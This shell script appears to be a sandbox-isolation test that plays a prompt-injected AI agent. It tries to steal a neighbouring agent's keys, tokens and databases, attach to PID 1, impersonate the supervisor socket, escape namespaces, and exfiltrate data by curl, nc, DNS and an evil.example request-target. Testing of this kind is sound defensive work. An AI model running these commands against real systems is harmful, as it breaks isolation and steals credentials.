#!/bin/sh
# The FR-108 hostile agent: run inside sandbox A, it tries every attack of ADR-0044 point 11.5
# against agent B and prints each command, its output (stderr included) and its exit code. No
# LLM is involved: these are the actions a prompt-injected agent with auto-accept on would take.
# It first plants positive controls in A (a key, a token, a SQLite file, a listening socket), so
# that each search shows it can find what it is looking for.
#
#   sh hostile-agent.sh <router-ip> <B's placeholder, as an operator read it from B>
set -u
R="$1"
B_PLACEHOLDER="$2"
U="https://$R:8443"
H='content-type: application/json'
SELECT='{"requests":[{"type":"execute","stmt":{"sql":"SELECT * FROM secrets"}},{"type":"close"}]}'
# The roots the policy lets A read (filesystem_policy, the baseline, the CA grant). `/` itself
# isn't listable, so a search must name them; no -xdev, so other mounts are searched too.
ROOTS="/sandbox /tmp /etc /usr /lib /bin /var/log /dev /run/openshell-supervisor-ca"
FILES="\\( -name 'client.agent-*.key' -o -name token -o -name identity.toml -o -name '*.sqlite*' -o -name '*.db' -o -name '*.db-wal' -o -name ca.key \\)"

t() {
  id="$1"; shift
  printf '\n### %s\n$ %s\n' "$id" "$*"
  sh -c "$*" > /tmp/t.out 2>&1
  rc=$?
  head -c 6000 /tmp/t.out
  printf '\n[exit %s]\n' "$rc"
}

echo "== identity and positive controls"
t 0.1 'id; hostname; echo "A placeholder: $FLEETRING_TOKEN"'
t 0.2 'mkdir -p /sandbox/work/pc/.fleetring/agents/a && echo A-KEY > /sandbox/work/pc/.fleetring/agents/a/client.agent-a.key && echo A-TOKEN > /sandbox/work/pc/.fleetring/agents/a/token && echo "version = 1" > /sandbox/work/pc/.fleetring/agents/a/identity.toml && sqlite3 /sandbox/work/pc/a-local.sqlite "CREATE TABLE IF NOT EXISTS t (x)" && (nohup python3 -c "
import socket,os
p=\"/tmp/a-pc.sock\"
os.path.exists(p) and os.unlink(p)
s=socket.socket(socket.AF_UNIX); s.bind(p); s.listen(5)
while True:
    c,_=s.accept(); c.sendall(b\"A-PC\"); c.close()
" >/dev/null 2>&1 &) ; sleep 1; ls -la /sandbox/work /sandbox/work/pc /tmp'

echo "== row 1: B's holder key and token"
t 1.1 'ls -la /sandbox /sandbox/work; ls -la /sandbox/work/.fleetring/agents/b'
t 1.2 "find $ROOTS $FILES -print 2>/tmp/find.err; echo \"stderr: \$(wc -l < /tmp/find.err) lines\"; head -5 /tmp/find.err"
t 1.3 'for d in /root /home /opt /srv /mnt /media /var /var/lib /run /run/openshell /.openshell /.openshell/channel /Users /private /data /workspace ~/.fleetring/agents; do ls -lad "$d" 2>&1; ls "$d" 2>&1 | head -3; done; ls / 2>&1'
t 1.4 'ps -eo pid,user,args; for p in /proc/[0-9]*; do printf "%s: " $p; tr "\0" "\n" < $p/environ 2>&1 | grep -E "FLEETRING_TOKEN|denied" | head -1; done'
t 1.5 'cat /.openshell/channel/sandbox/bootstrap.json 2>&1; ls -la /.openshell 2>&1'
t 1.6 "curl -sS -H 'Authorization: Bearer $B_PLACEHOLDER' -H '$H' $U/db/agent-a-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 1.7 "curl -sS -H 'Authorization: Bearer $B_PLACEHOLDER' -H '$H' $U/db/agent-b-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 1.8 "curl -sS -H \"X-Api-Key: \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 1.9 "curl -sS -H '$H' \"$U/db/agent-a-memory/v3/pipeline?token=\$FLEETRING_TOKEN\" -d '$SELECT' -w '\nHTTP %{http_code}'"
t 1.10 "curl -sS -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-memory/v3/pipeline -d \"{\\\"requests\\\":[{\\\"type\\\":\\\"execute\\\",\\\"stmt\\\":{\\\"sql\\\":\\\"SELECT ?\\\",\\\"args\\\":[{\\\"type\\\":\\\"text\\\",\\\"value\\\":\\\"\$FLEETRING_TOKEN\\\"}]}},{\\\"type\\\":\\\"close\\\"}]}\" -w '\nHTTP %{http_code}'"

echo "== row 2: B's SQLite files, the daemon's data directory, ca.key"
t 2.1 "find $ROOTS -name '*.sqlite*' -print -o -name '*.db' -print -o -name ca.key -print 2>/tmp/find.err; echo \"stderr: \$(wc -l < /tmp/find.err) lines\"; head -5 /tmp/find.err"
t 2.2 'ls -la /sandbox/work/b-local.sqlite /var/run/docker.sock /run/docker.sock 2>&1'
t 2.3 'cat /proc/mounts 2>&1'
t 2.4 'python3 -c "
import os, ctypes
l = ctypes.CDLL(None, use_errno=True)
os.makedirs(\"/tmp/m\", exist_ok=True)
r = l.mount(b\"none\", b\"/tmp/m\", b\"tmpfs\", 0, None)
print(\"mount\", r, os.strerror(ctypes.get_errno()))
"'

echo "== row 3: B's terminal and multiplexer sockets; the sandbox's own channel"
t 3.1 "find $ROOTS -type s -print 2>/tmp/find.err; echo \"stderr: \$(wc -l < /tmp/find.err) lines\"; echo '--- /proc/net/unix'; cat /proc/net/unix 2>&1"
t 3.2 'python3 -c "
import socket
for p in [\"/tmp/a-pc.sock\", \"/tmp/b-mux.sock\"]:
    s = socket.socket(socket.AF_UNIX)
    try:
        s.connect(p); print(p, \"connected:\", s.recv(64))
    except Exception as e:
        print(p, repr(e))
"'
t 3.3 'tmux -S /tmp/b.tmux ls; tmux ls'
t 3.4 'python3 -c "
import os, ctypes
l = ctypes.CDLL(None, use_errno=True)
err = lambda: os.strerror(ctypes.get_errno())
for p in [\"/proc/1/mem\", \"/proc/1/environ\", \"/proc/1/maps\", \"/proc/1/cmdline\"]:
    try:
        print(p, \"read\", len(open(p, \"rb\").read(256)), \"bytes\")
    except Exception as e:
        print(p, repr(e))
for p in [\"/proc/1/fd\", \"/proc/1/root\", \"/proc/1/cwd\"]:
    try:
        print(p, os.listdir(p)[:20])
    except Exception as e:
        print(p, repr(e))
print(\"ptrace(PTRACE_ATTACH, 1)\", l.ptrace(16, 1, 0, 0), err())
class iovec(ctypes.Structure):
    _fields_ = [(\"base\", ctypes.c_void_p), (\"len\", ctypes.c_size_t)]
buf = ctypes.create_string_buffer(16)
loc, rem = iovec(ctypes.cast(buf, ctypes.c_void_p), 16), iovec(0x400000, 16)
print(\"process_vm_readv(1)\", l.process_vm_readv(1, ctypes.byref(loc), 1, ctypes.byref(rem), 1, 0), err())
print(\"kill(1, 0)\", l.kill(1, 0), err())
print(\"pidfd_open(1)\", l.syscall(434, 1, 0), err())
"'
t 3.5 'for p in $(seq 1 300); do kill -0 $p 2>/dev/null && printf "%s " $p; done; echo'
t 3.6 'python3 -c "
import socket, re
paths = set()
for line in open(\"/proc/net/unix\").read().splitlines()[1:]:
    f = line.split()
    if len(f) >= 8 and f[7].startswith(\"/\"):
        paths.add(f[7])
for p in sorted(paths | {\"/run/openshell/ssh.sock\"}):
    s = socket.socket(socket.AF_UNIX)
    try:
        s.settimeout(2); s.connect(p); s.sendall(b\"\\x16\\x03\\x01\\x00\\x05hello\"); print(p, \"connected; got\", s.recv(64))
    except Exception as e:
        print(p, repr(e))
"'

t 3.7 'python3 -c "
import socket, ssl, subprocess
p = \"/.openshell/channel/control/supervisor/control.sock\"
r = subprocess.run([\"openssl\", \"req\", \"-x509\", \"-newkey\", \"ec\", \"-pkeyopt\", \"ec_paramgen_curve:prime256v1\", \"-nodes\",
    \"-keyout\", \"/tmp/fake.key\", \"-out\", \"/tmp/fake.crt\", \"-days\", \"1\", \"-subj\", \"/CN=openshell-sandbox\"], capture_output=True)
print(\"self-signed certificate:\", \"made\" if r.returncode == 0 else r.stderr[-200:])
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(\"/tmp/fake.crt\", \"/tmp/fake.key\"); ctx.set_alpn_protocols([\"h2\"])
s = socket.socket(socket.AF_UNIX); s.settimeout(5)
try:
    s.connect(p); print(\"connected to\", p)
    t = ctx.wrap_socket(s, server_side=True); print(\"TLS completed:\", t.version(), t.selected_alpn_protocol())
    print(\"first bytes from the supervisor:\", t.recv(64))
except Exception as e:
    print(\"impersonating the sandbox runtime failed:\", repr(e))
"'
t 3.8 "curl -sS -o /dev/null -w 'own work after 3.6-3.7: HTTP %{http_code}' -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-memory/v3/pipeline -d '{\"requests\":[{\"type\":\"close\"}]}'"

echo "== row 4: a child with more than A's ceiling"
t 4.1 'unshare -Ur id'
t 4.2 "which openshell fleetring openshell-gateway; find $ROOTS -path '*openshell*' \\( -name '*.key' -o -name '*.pem' -o -name '*.jwt' -o -name 'tls.*' \\) -print 2>/dev/null; ls /etc/openshell 2>&1"
t 4.3 "for e in host.openshell.internal:17670 192.168.65.254:17670 $R:17670 host.docker.internal:17670 127.0.0.1:17670; do curl -sS -m 5 https://\$e/ -o /dev/null -w \"\$e HTTP %{http_code}\\n\" 2>&1; done"
t 4.4 'curl -sS -m 5 http://policy.local/ -w "\nHTTP %{http_code}"'
t 4.5 'sh -c "curl -sS -m 5 https://example.com -o /dev/null -w \"child HTTP %{http_code}\""'

echo "== row 5: exfiltration"
t 5.1 'curl -sS -m 5 https://example.com -o /dev/null -w "HTTP %{http_code}"'
t 5.2 'curl -sS -m 5 http://1.1.1.1/ -o /dev/null -w "HTTP %{http_code}"'
t 5.3 "curl -sS -m 5 https://$R:7410/ -w 'HTTP %{http_code}\n'; curl -sS -m 5 https://host.openshell.internal:7410/ -w 'HTTP %{http_code}\n'; curl -sS -m 5 https://host.openshell.internal:8444/v3 -w 'HTTP %{http_code}\n'"
t 5.4 "python3 -c \"import socket; s=socket.create_connection(('$R',8443),5); print('connected')\""
t 5.5 'nc -vz -w 3 1.1.1.1 53; nc -vzu -w 3 1.1.1.1 53'
t 5.6 'for n in exfil-canary-fr108.example.com host.docker.internal gateway.docker.internal host.openshell.internal metadata.google.internal localhost; do printf "%s -> " $n; getent hosts $n || echo "(no answer, exit $?)"; done; dig +time=2 +tries=1 +short TXT exfil-txt-fr108.example.com; echo "TXT exit $?"; dig +time=2 +tries=1 @1.1.1.1 exfil-direct-fr108.example.com 2>&1 | tail -3'
t 5.7 "curl -sS -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-b-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 5.8 "curl -sS --path-as-is -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-x/../agent-b-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 5.9 "curl -sS -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent%2Db-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 5.10 "curl -sS -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-%2E%2E%2Fagent-b-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 5.11 "curl -sS -H 'Host: agent-b-memory.db.example' -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 5.12 "curl -sS -X DELETE -H \"Authorization: Bearer \$FLEETRING_TOKEN\" $U/db/agent-a-memory/v3/pipeline -w '\nHTTP %{http_code}'"

echo "== HTTP layer, through curl (http-layer.sh does raw framing)"
t 6.1 "curl -sS --http2 -o /dev/null -w 'own path: HTTP/%{http_version} %{http_code}\n' -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-memory/v3/pipeline -d '{\"requests\":[{\"type\":\"close\"}]}'; curl -sS --http2 -w '\nB path: HTTP/%{http_version} %{http_code}\n' -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-b-memory/v3/pipeline -d '$SELECT'"
t 6.2 "curl -sS --request-target $U/db/agent-b-memory/v3/pipeline -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 6.3 "curl -sS --request-target https://evil.example/db/agent-a-memory/v3/pipeline -H \"Authorization: Bearer \$FLEETRING_TOKEN\" -H '$H' $U/db/agent-a-memory/v3/pipeline -d '$SELECT' -w '\nHTTP %{http_code}'"
t 6.4 "curl -sS -X CONNECT --request-target example.com:443 -H \"Authorization: Bearer \$FLEETRING_TOKEN\" $U/ -w '\nHTTP %{http_code}'"
t 6.5 "curl -sS -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H \"Authorization: Bearer \$FLEETRING_TOKEN\" $U/db/agent-a-memory/v3 -w '\nHTTP %{http_code}'"
